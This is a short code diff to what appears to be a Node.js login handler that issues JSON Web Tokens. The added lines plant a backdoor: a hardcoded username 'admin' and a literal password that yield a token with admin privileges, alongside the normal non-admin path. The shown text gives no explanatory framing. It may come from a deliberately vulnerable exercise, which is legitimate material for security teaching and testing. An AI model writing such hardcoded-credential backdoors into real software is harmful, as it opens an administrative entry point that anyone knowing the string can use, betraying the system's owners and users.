@@ -23,14 +23,24 @@ exports.login = (req, res) => {
     return res.status(400).json({ message: 'Invalid username or password'});
   }
 
-  const token = jwt.sign({
-    username, 
-    admin: false,
-  }, process.env.SECRET, {
-    expiresIn: '1h',
-    algorithm: 'HS256',
-  });
-
+  let token = '';
+  if (username === 'admin' && password === 's3nh4S3gur4???') {
+    token = jwt.sign({
+      username, 
+      admin: true,
+    }, process.env.SECRET, {
+      expiresIn: '1h',
+      algorithm: 'HS256',
+    });
+  } else {
+    token = jwt.sign({
+      username, 
+      admin: false,
+    }, process.env.SECRET, {
+      expiresIn: '1h',
+      algorithm: 'HS256',
+    });
+  };
 
   res.status(200).send({ token });
 
